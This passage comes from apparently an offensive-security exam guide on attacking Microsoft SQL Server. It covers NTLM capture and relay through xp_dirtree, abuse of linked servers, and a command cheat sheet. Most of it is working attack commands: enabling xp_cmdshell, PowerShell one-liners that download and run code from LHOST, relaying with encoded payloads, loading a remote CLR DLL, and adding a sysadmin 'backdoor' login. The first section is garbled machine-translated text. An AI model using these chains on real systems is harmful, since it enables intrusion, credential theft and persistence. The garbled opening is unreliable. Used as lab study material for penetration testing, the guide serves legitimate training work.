`xp dirtree ' was rejected (also reported as `EXECUTE permission denied ' ) → on a case-by-case basis for an extended storage process: `EXEC master..xp subdirs ' \\LHOST\x'; `EXEC master..xp filelist ' \\LHOST\x'; `; still not looking for storage processes/triggers/operations as defined in sysadmin ' ** or `EXECUTE AS ' simulated objects (`Invoke-SQLAuditPrimpersante Login ' ) within the database to trigger UNC.
2. Target SMB Forced Signature → Relay Non-feasible Cut Route A (Responder Capture + Hashcat Decryption) or Search for HTTP/HTTPS/LDAP Relayx-t http://.../ / `-tldap://..., for the HTTP service without EPA, with reference to ESC8 in M12 scenario 55).
3. The SQL host cannot go online to `LHOST ' (backway blocked by firewall) `lister add-addr 0.0.0.0:445 -to 127.0.0.1:445 ' , changing the trigger target from \LHOST\ ' to \ligolo listening address \ (see section M08 `Tunneling ' for details).
Responder clashed with the ntlmrelayx port / other hosts in the environment robbed 445 → and opened only one service; Responder changed the interface or used `-w`/`-r ' for precise control; confirmed that Restonder and relayx were not hung together 445.
5. Relay orders are replaced with memory loads (`-c "powershell ..." direct IEX download strings), phased or coded (M05/M07 method).

**Exam notes / OPSEC**:
- Responder / ntlrelayx listening 445 will temporarily affect the normal SMB traffic in the network; careful not to draw DC authentication into the examination network to cause "account lock" noise, recommending that `responder-I<face' be activated and completed as soon as possible.
- Trigger actions such as `xp dirtree ' will appear in SQL Server ' s error log/Profiller; the experimental environment is safe and the formal environment is assessed first.
- The identity of the relay** is not an interactive document: it is used horizontally to give priority to SMB/service (wmiexec, psexec) and not to waste time trying RDP (unless the account number has Remote Desktop Users).
- Clearly record whether the target account number belongs to a "sensitive account" (domain pipe/service account) and the authority to succeed in relaying is determined by the local group member whose account number is on the target.

---

## Scenario 45: Linked Server can query, but remote execution fails

**Situation**: You can access instance A, which has a Linked Server to B (and maybe C). Querying B's data from A works, but anything involving **remote execution** (`EXEC ... AT B`, `xp_cmdshell` on B, cross-server RPC) fails. Causes usually fall in three places: low privileges on B's **mapped login**, **RPC/RPC Out** disabled on A→B, and **mismatched privileges** (e.g. A is sysadmin but the mapping on B is only public).

**Assumptions**:
- Valid login on A (SQL or Windows auth), at least `public`, often lower.
- A already shows a Linked Server named `LINKED_B` (this note uses `TARGET2` for its host); `SELECT` works (otherwise fix connectivity/creds first — not this scenario's failure mode).
- A = source, B = one hop, C = two hops (A→B→C).
- Ready: `impacket-mssqlclient` (Linux) or PowerUpSQL/SQLRecon (Windows), `m11-linked-server-queries.sql`.

**Prepare (attacker)**:
1. Connect to source A:
   ```bash
   impacket-mssqlclient USER:PASS@A_HOST        # SQL auth
   impacket-mssqlclient DOMAIN/USER:PASS@A_HOST -windows-auth   # Windows auth
   ```
2. Confirm linked servers list (SQL Server 2008+ via `sys.servers`):
   ```sql
   SELECT name, product, provider, data_source, is_linked, is_rpc_out_enabled,
          is_data_access_enabled, is_remote_provider_enabled
   FROM sys.servers;
   ```
   Expect at least one row with `is_linked = 1`.
3. Prefer **short payloads**: long commands through Linked Server fail easily on quotes/length; put heavy content behind a URL download (`http://LHOST/x.ps1`) so the remote side runs the shortest command. Stage payload files on the attacker HTTP directory.

**Procedure**:

1. Pin down "can query, cannot execute" — test in order:
   ```sql
   -- (a) single-hop query: does it work?
   SELECT * FROM OPENQUERY("TARGET2", 'SELECT @@SERVERNAME AS srv, SYSTEM_USER AS u, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa');
   -- (b) EXEC AT remote exec: what error when it fails?
   EXEC ('SELECT @@SERVERNAME') AT TARGET2;
   -- (c) four-part name (needs remote data access + metadata; often off by default on A)
   SELECT * FROM [TARGET2].[master].[dbo].[syslogins];   -- OLE DB provider errors → check data access
   ```
   Common errors:
   - `Ad Hoc Distributed Queries` / OLE DB cannot be used for distributed queries → `data access`/OPENQUERY config (step 4).
   - `not configured for RPC` → `rpc out` off (step 3).
   - `Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'` → **double-hop** delegation failure (see If it fails #3).
   - Remote exec works but `xp_cmdshell` permission denied → mapped account on B is not sysadmin (step 5).

2. Check **remote identity and privileges** (who actually runs on B):
   ```sql
   EXEC ('SELECT SYSTEM_USER AS remote_user, USER_NAME() AS db_user, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa') AT TARGET2;
   -- empty/guest → mapped guest login → very low privs
   ```
   See if B has deeper links (for multi-hop):
   ```sql
   SELECT * FROM OPENQUERY("TARGET2", 'SELECT name, is_rpc_out_enabled, is_linked FROM sys.servers');
   ```

3. **Fix RPC** (RPC Out = allow `EXEC ... AT` to the remote):
   ```sql
   SELECT name, is_rpc_out_enabled FROM sys.servers WHERE name='TARGET2';
   -- if 0 and you have sysadmin (or CONTROL SERVER / ALTER ANY LINKED SERVER):
   EXEC sp_serveroption 'TARGET2', 'rpc out', 'true';
   -- without sysadmin this is a hard limit: impersonate a sysadmin, or fall back to OPENQUERY read-only
   ```
   Try impersonation first when low-priv:
   ```sql
   EXECUTE AS LOGIN = 'sa';
   EXEC sp_serveroption 'TARGET2', 'rpc out', 'true';
   REVERT;
   ```

4. For `OPENQUERY`, enable data access on A→B:
   ```sql
   EXEC sp_serveroption 'TARGET2', 'data access', 'true';   -- also needs enough privs
   ```

5. **Enable xp_cmdshell on B and execute** (mapped identity on B is sysadmin, or you can impersonate to that):
   ```sql
   EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT TARGET2;
   EXEC ('EXEC master..xp_cmdshell ''whoami''') AT TARGET2;
   ```

6. **Single-hop command / shell** (keep remote commands short; download the long part):
   ```sql
   EXEC ('EXEC master..xp_cmdshell ''whoami /all''') AT TARGET2;
   EXEC ('EXEC master..xp_cmdshell ''powershell -nop -w hidden -c "iex(iwr http://LHOST/run.ps1)"''') AT TARGET2;
   EXEC ('EXEC master..xp_cmdshell ''powershell -enc <BASE64>''') AT TARGET2;
   ```
   For callback: attacker `nc -nvlp LPORT` first; HTTP dir serves run.ps1.

7. **Multi-hop (A→B→C) template** — from A, EXEC to B a string that makes B EXEC to C:
   ```sql
   SELECT * FROM OPENQUERY("TARGET2", 'SELECT name, is_rpc_out_enabled FROM sys.servers');
   EXEC ('EXEC (''EXEC master..xp_cmdshell ''''whoami'''''') AT TARGET3') AT TARGET2;
   SELECT * FROM OPENQUERY("TARGET2", 'SELECT * FROM OPENQUERY("TARGET3", ''SELECT @@SERVERNAME AS srv'')');
   ```
   Quote rules (easy to get wrong):
   - Outer SQL: single-quoted strings; inner single quotes → doubled `''`.
   - `OPENQUERY` server names use double quotes; when nested inside another string, double quotes stay, but an outer PowerShell/shell layer needs that shell's escaping.
   - Full templates: `m11-linked-server-queries.sql`.

8. After a sysadmin session on B:
   - Run OS commands (above).
   - Or add a login on B for later direct access (persistence — only if the objective requires it):
     ```sql
     EXEC ('EXEC sp_addlogin ''backdoor'', ''P@ssw0rd!''') AT TARGET2;
     EXEC ('EXEC sp_addsrvrolemember ''backdoor'', ''sysadmin''') AT TARGET2;
     ```

**Lab files**:
| File | Purpose | Key args |
|---|---|---|
| `m11-linked-server-queries.sql` | Link enum / single-hop / multi-hop / `EXEC ... AT` templates (quote notes) | replace `TARGET2`/`TARGET3` |
| `m11-powerupsql-templates.ps1` | `Get-SQLServerLinkCrawl`, `Invoke-SQLAudit`, xp_cmdshell wrappers | `-Instance A_HOST` |
| `m11-sqlrecon-templates.ps1` | SQLRecon link modules (links / linkquery / linkcmd) | `/h:A_HOST /m:linkquery` |
| `m11-responder-relay-sql.sh` | If B is a relay target — cleanup path | `TARGET` |

**Verify**:
- `EXEC ('SELECT @@SERVERNAME, SYSTEM_USER') AT TARGET2` returns B's hostname and remote user → RPC works.
- Step 5 `xp_cmdshell 'whoami'` returns something like `nt service\mssql$...` or `DOMAIN\svc_sql` → remote exec works.
- Multi-hop returns C's `whoami` → full chain.
- Reverse-shell listener gets a connection.

**If it fails / alternatives**:
1. `EXEC ... AT` says not configured for RPC → impersonate sysadmin and enable `rpc out`; else OPENQUERY read-only or new creds. Without RPC Out you cannot remotely invoke procedures/xp_cmdshell — data query only.
2. Remote exec works but not sysadmin → enumerate/impersonate on B; PowerUpSQL `Invoke-SQLAuditPrivImpersonateLogin -Exploit`.
3. Multi-hop `ANONYMOUS LOGON` / Kerberos delegation → double-hop blocked; use four-part **data** access, or pull C's connection info from B and connect to C directly if the port is reachable.
4. Command too long / quote errors → download+exec short form only: `powershell -enc <shortBASE64>` or `curl http://LHOST/x`.
5. OPENQUERY OLE DB / distributed queries disabled → need `data access=true` (sysadmin); else pull B's data with plain `SELECT` loops on A.
6. A is low-priv with no impersonatable sysadmin → return to scenario 44 (trigger outbound auth + relay).

**Exam notes / OPSEC**:
- **Quote escaping is the top point-loss**: always know which nesting layer you are in; copy templates and only change server names.
- Enabling remote `xp_cmdshell` is noisy (SQL audit events); disable after validation if the objective allows.
- `sp_addlogin` backdoors are persistence — exam only when required; record and clean up.
- Decide whether you need **data access** or **server control**: many objectives only need reading a table on B via Linked Server — skip xp_cmdshell when least privilege already satisfies the goal.

---

## Module cheat sheet

| Goal | Command (example) |
|---|---|
| Connect SQL (SQL auth) | `impacket-mssqlclient USER:PASS@TARGET` |
| Connect SQL (Windows auth) | `impacket-mssqlclient DOMAIN/USER:PASS@TARGET -windows-auth` |
| Check sysadmin | `SELECT IS_SRVROLEMEMBER('sysadmin');` |
| xp_cmdshell status | `SELECT name,value_in_use FROM sys.configurations WHERE name='xp_cmdshell';` |
| Enable xp_cmdshell | `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` |
| Trigger outbound auth (capture/relay) | `EXEC master..xp_dirtree '\\LHOST\share';` |
| Responder capture | `sudo responder -I eth0` |
| hashcat Net-NTLMv2 | `hashcat -m 5600 hash.txt rockyou.txt` |
| Relay to SMB target | `impacket-ntlmrelayx --no-http-server -smb2support -t smb://TARGET -c "powershell -enc <B64>"` |
| List Linked Servers | `SELECT name,is_linked,is_rpc_out_enabled FROM sys.servers;` |
| Single-hop query | `SELECT * FROM OPENQUERY("TARGET2", 'SELECT @@SERVERNAME');` |
| Single-hop exec | `EXEC ('EXEC master..xp_cmdshell ''whoami''') AT TARGET2;` |
| Enable remote RPC Out | `EXEC sp_serveroption 'TARGET2','rpc out','true';` |
| Multi-hop exec (A→B→C) | `EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT TARGET3') AT TARGET2;` |
| Audit/impersonate (PowerUpSQL) | `Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance TARGET -Exploit` |
| CLR exec (SQLRecon) | `SQLRecon.exe /a:WinToken /h:TARGET /m:impersonate /i:sa /m:clr /dll:http://LHOST/Warhead.dll /function:Main` |
| Short BASE64 (local) | `echo -en 'IEX (...)' \| iconv -t UTF-16LE \| base64 -w 0` |

## Related lab files

| File | Purpose |
|---|---|
| `m11-linked-server-queries.sql` | Linked Server enum / single-hop / multi-hop / EXEC AT templates and quote escaping |
| `m11-powerupsql-templates.ps1` | PowerUpSQL discovery / enum / audit / impersonate / exec / CLR templates |
| `m11-sqlrecon-templates.ps1` | SQLRecon module counterparts (info / impersonate / xpcmd / olecmd / clr / links) |
| `m11-responder-relay-sql.sh` | Responder / ntlmrelayx one-shot flow + print SQL trigger commands |
